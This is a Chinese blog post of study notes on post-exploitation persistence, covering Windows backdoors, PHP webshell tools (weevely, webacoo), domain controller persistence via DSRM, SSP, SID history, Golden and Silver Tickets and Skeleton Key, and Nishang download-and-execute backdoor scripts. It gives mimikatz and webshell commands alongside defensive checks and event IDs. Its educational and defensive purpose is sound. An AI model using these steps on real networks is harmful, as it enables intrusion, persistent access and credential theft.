<h3 id="常用操作系统后门"><a href="#常用操作系统后门" class="headerlink" title="常用操作系统后门"></a>常用操作系统后门</h3><ul>
<li>粘滞键后门：通过用cmd.exe替换粘滞键可执行文件<code>\windows\system32\sethc.exe</code>，可以以System权限执行命令 </li>
<li>注册表注入后门：将可执行文件写入到注册表键的<em>启动项</em>中，在登录时便能执行后门程序 </li>
<li>计划任务后门：通过计划任务自动执行或生成后门程序 </li>
<li>meterpreter后门：meterpreter自带，使用安装自启动方式的持久性后门程序 </li>
<li>Cymothoa后门：将shellcode注入到现有进程中的后门程序</li>
</ul>
<h3 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h3><p>特定：</p>
<ul>
<li>只能由由<em>管理员权限</em>的用户运行 </li>
<li>使用powershell编写 </li>
<li>可以直接从新的WMI属性中读取和执行后门代码，给代码加密</li>
</ul>
<p>优势：无文件，无进程</p>
<p>原理： </p>
<ol>
<li>无文件：将代码加密存储于WMI中,实现无文件</li>
<li>无进程：满足条件时，系统自动powershell进程执行后门程序，执行后进程消失，实现无进程</li>
</ol>
<h2 id="Web后门分析与防范"><a href="#Web后门分析与防范" class="headerlink" title="Web后门分析与防范"></a>Web后门分析与防范</h2><p>即WebShell，精心构造的网页代码实现权限维持的后门。</p>
<h3 id="weevely后门"><a href="#weevely后门" class="headerlink" title="weevely后门"></a>weevely后门</h3><p><a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">python编写的针对php的webshell</a> </p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成WebShell</span></span><br><span class="line">weevely generate &lt;密码&gt; &lt;生成文件路径&gt;</span><br></pre></td></tr></table></figure>

<p>将生成的.php文件上传到目标机器，并且能通过外网访问到文件，此时可以连接WebShell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely &lt;目标url,以文件名结尾&gt; &lt;密码&gt;</span><br></pre></td></tr></table></figure>

<h3 id="webacoo后门"><a href="#webacoo后门" class="headerlink" title="webacoo后门"></a>webacoo后门</h3><p>也是针对PHP平台的Web后门工具。 </p>
<p>制作后门工具: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o &lt;生成文件路径&gt; </span><br></pre></td></tr></table></figure>

<p>如何连接webShell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u &lt;目标url&gt;</span><br></pre></td></tr></table></figure>

<h2 id="域控制器权限持久化分析与防范"><a href="#域控制器权限持久化分析与防范" class="headerlink" title="域控制器权限持久化分析与防范"></a>域控制器权限持久化分析与防范</h2><h3 id="DSRM目录恢复模式"><a href="#DSRM目录恢复模式" class="headerlink" title="DSRM目录恢复模式"></a>DSRM目录恢复模式</h3><p>DSRM(DirectoryServicesRestoreMode,目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。 </p>
<p>每个域控制器都有一个本地管理员账户（也就是DSRM账户）。 </p>
<p>DSRM允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。</p>
<p>修改DSRM密码最基本的方法是在<strong>DC</strong>上运行ntdsutil命令行工具。</p>
<p>因此可以通过DSPM实现对域环境的权限持久化。</p>
<p>具体步骤：</p>
<ol>
<li>使用mimikatz查看krbtgt的NTLMHash</li>
<li>使用mimikatz查看并读取SAM文件中本地管理员的NTLM Hash</li>
<li>将DSRM账号和krbtgt的NTLM Hash同步</li>
<li>查看DSRM的NTLMHash是否同步成功</li>
<li>修改DSRM的登录方式：新建注册表<code>HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code>并配置为“2”：在任何情况下，都可以使用DSRM管理员账号登录域控制器。</li>
<li>使用DSRM账号通过网络远程登录域控制器</li>
<li>使用mimikatz的dcysnc功能远程转储krbtgt的NTLM Hash</li>
</ol>
<p>此时完成哈希传递，会打开一个命令行。</p>
<h4 id="防范-3"><a href="#防范-3" class="headerlink" title="防范"></a>防范</h4><p>■ 定期检查注册表中用于控制DSRM登录方式的键值HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior,确认该键值为1,或者删除该键值。</p>
<p>■ 定期修改域中所有域控制器的DSRM账号。</p>
<p>■ 经常检查ID为4794的日志。尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中。</p>
<h3 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="SSP维持域控权限"></a>SSP维持域控权限</h3><p>SSP(Security Support Provider)是Windows操作系统安全机制的提供者。 </p>
<p>简单地说，SSP就是一个DLL文件，主要用来实现Windows操作系统的身份认证功能。</p>
<blockquote>
<p>基本原理：</p>
<p>LSA(Local Security Authority)用于身份验证；<strong>lsass.exe</strong>作为Windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsasS.exe进程中。</p>
<p>但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</p>
</blockquote>
<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>■ 检査HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa&#x2F;SecurityPackages项中是否含有可疑的DLL文件。</p>
<p>■ 检查C:\Windows\System32\目录下是否有可疑的DLL文件。</p>
<p>■ 使用第三方工具检查LSA中是否有可疑的DLL文件。</p>
<h3 id="SID-history"><a href="#SID-history" class="headerlink" title="SID history"></a>SID history</h3><p>每个用户都有自己的SID。 </p>
<p>SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。 </p>
<p>SIDHistory是在域迁移过程中需要使用的一个属性，用于在域迁移过程中保持域用户的<em>访问权限</em>。</p>
<p>利用需要有<strong>域管理员权限</strong>。</p>
<p>使用mimikatz:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::add /sam:<span class="built_in">test</span> /new:administrator</span><br></pre></td></tr></table></figure>

<h4 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h4><p>■ 经常査看域用户中SID为500的用户。</p>
<p>■ 完成域迁移工作后，对有相同SIDHistoiy属性的用户进行检查。</p>
<p>■ 定期检査ID为4765和4766的日志。4765为将SIDHistory属性添加到用户的日志。4766为将SIDHistory属性添加到用户失败的日志。</p>
<h3 id="Golden-Ticket（重要）"><a href="#Golden-Ticket（重要）" class="headerlink" title="Golden Ticket（重要）"></a>Golden Ticket（重要）</h3><p>在安全运维过程中，如果发现系统中存在恶意行为，应及时<strong>更改域管理员密码</strong>，对受控机器进行断网处理，然后进行日志分析及取证。</p>
<p>然而，攻击者往往会给自己留下多条进入内网的通道,如果我们忘记将<em>krbtgt</em>账号重置，攻击者就能快速重新拿回域控制器权限。</p>
<blockquote>
<p>krbtgt是<em>KDC服务</em>使用的账号，属于Domain Admins组。</p>
<p>在域环境中，每个用户账号的<strong>票据</strong>都是由<strong>krbtgt</strong>生成的，如果攻击者拿到了krbtgt的NTLM Hash或者AES-256值，就可以伪造域内<strong>任意用户</strong>的身份，并以该用户的身份访问其他服务。</p>
</blockquote>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol>
<li>导出krbtgt的NTLM Hash </li>
<li>获取域SID：<code>wmic useraccount get name,sid</code></li>
<li>获取当前用户SID：<code>whoami /user</code></li>
<li>查询管理员账号:<code>net group &quot;domain admins&quot; /domain</code></li>
<li>查询域名:<code>ipconfig /all</code></li>
<li>生成票据 </li>
<li>清空票据 </li>
<li>注入票据</li>
</ol>
<p>注：使用krbtgt的AES-256值生成票据并将其注人内存，也可以伪造用户。之前导出的krbtgt信息中就有这个值。</p>
<h4 id="防范-4"><a href="#防范-4" class="headerlink" title="防范"></a>防范</h4><p>■ 使用GoldenTicket伪造的用户可以是<strong>任意用户</strong>，即使这个用户不存在</p>
<p>■ 提升域功能级别时修改krbtgt的密码</p>
<p>■ 用户自行进行安全检查和相关服务加固时修改krbtgt的密码</p>
<h3 id="SilverTicket"><a href="#SilverTicket" class="headerlink" title="SilverTicket"></a>SilverTicket</h3><p>与黄金票据的不同：</p>
<p>1.获取的权限不同：</p>
<ul>
<li>金票：伪造的TGT（票据授权服务产生的票据文件），可以获取任意Kerberos的访问权限 </li>
<li>银票：伪造的ST，只能访问指定的服务，如CIFS</li>
</ul>
<ol start="2">
<li>认证流程不同：</li>
</ol>
<ul>
<li>金票：与KDC交互，但不与AS交互 </li>
<li>银票：不与KDC交互，直接访问Server</li>
</ul>
<ol start="3">
<li>加密方式不同：</li>
</ol>
<ul>
<li>金票：由krbtgt NTLM Hash 加密 </li>
<li>银票：由服务账号 NTLM Hash 加密</li>
</ul>
<h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>使用SilverTicket伪造CIFS服务权限：</p>
<blockquote>
<p>与黄金票据类似，只是在使用mimikatz生成伪造的Silver Ticket</p>
</blockquote>
<p>获取服务账号NTLM Hash </p>
<ol>
<li>查询域名 </li>
<li>获取域SID </li>
<li>获取伪造的目标用户名 </li>
<li>生成票据 </li>
<li>清空票据 </li>
<li>注入票据</li>
</ol>
<p>使用SilverTicket伪造LDAP服务权限，与之类似。</p>
<h4 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h4><p>■ 在内网中安装杀毒软件，及时更新系统补丁。</p>
<p>■ 使用组策略在域中进行相应的配置，限制mimikatz在网络中的使用。</p>
<p>■ 计算机的账号和密码默认每30天更改一次。检查该设置是否生效。</p>
<h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>使用Skeleton Key(万能密码），可以对域内权限进行持久化操作。</p>
<p>攻击流程：</p>
<p>使用mimikatz将SkeletonKey注人域控制器的lsass.exe进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<p>此时，会在域内的所有账号中添加一个SkeletonKey,其密码默认为mimikatz。</p>
<p>然后使用域管理员账号和SkeletonKey与域控制器建立ipc$：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc08\ipc$ <span class="string">&quot;mimikatz&quot;</span> /user:<span class="string">&quot;pentest\administrator&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施"></a>防御措施</h4><p>■ 域管理员用户要设置强口令，确保恶意代码不会在域控制器中执行。</p>
<p>■ 在所有域用户中启用双因子认证，例如智能卡认证。</p>
<p>■ 启动应用程序白名单（例如AppLocker),以限制mimikatz在域控制器中的运行。</p>
<h2 id="Nishang下的脚本后门分析与防范"><a href="#Nishang下的脚本后门分析与防范" class="headerlink" title="Nishang下的脚本后门分析与防范"></a>Nishang下的脚本后门分析与防范</h2><p>Nishang是基于PowerShell的渗透测试工具，集成了很多框架、脚本及各种Payload。</p>
<ol>
<li><p><em>HTTP-Backdoor</em>脚本可以帮助攻击者在目标主机上下载和执行PowerShell脚本，接收来自第三方网站的指令，在内存中执行PowerShell脚本，</p>
<p> ■ -CheckURL：给出一个URL地址。如果该地址存在，MagicString中的值就会执行Payload,下载并运行攻击者的脚本。</p>
<p> ■ -PayloadURL：给出需要下载的PowerShell脚本的地址。</p>
<p> ■ -StopString：判断是否存在CheckURL返回的字符串，如果存在则停止执行。</p>
</li>
<li><p><em>Add-ScrnSaveBackdoor</em>脚本可以帮助攻击者利用Windows的屏幕保护程序来安插一个隐藏的后门</p>
<p> ■ -PayloadURL：指定需要下载的脚本的地址。</p>
<p> ■ -Arguments：指定需要执行的函数及相关参数。</p>
</li>
<li><p><em>Execute-OnTime</em>脚本用于在目标主机上指定PowerShell脚本的执行时间</p>
<p> ■ -PayloadURL:指定下载的脚本的地址。</p>
<p> ■ -Arguments：指定要执行的函数名。</p>
<p> ■ -Time:设置脚本执行的时间，例如“-Time23:21”。</p>
<p> ■ -CheckURL：检测一个指定的URL里是否存在StopString给出的字符串，如果存在就停止执行。</p>
</li>
<li><p>Invoke-ADSBackdoor脚本能够向ADS注入代码并以普通用户权限运行。</p>
</li>
</ol>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/06/18/Note-of-Linear-Algebraic/"
      title="线性代数笔记"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        线性代数笔记
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/06/10/Note-of-Local-Address-Net-Security/"
      title="内网安全攻防笔记(上)"
     >

    <p class="title-text">
      
        内网安全攻防笔记(上)
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>


  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <div id="comment-card" class="comment-card">
    <div class="main-title-bar">
      <div class="main-title-dot"></div>
      <div class="main-title">留言 </div>
    </div>
    <div id="vcomments"></div>
  </div>
  <script>
      new Valine({
          el: '#vcomments',
          appId: "j9YBSIHTlRyfuvPQqY50ARfV-gzGzoHsz",
          appKey: "Q7s9zRzne9zaSVrroDR2wgO8"
      })
  </script>
 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2024 Kizureina<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
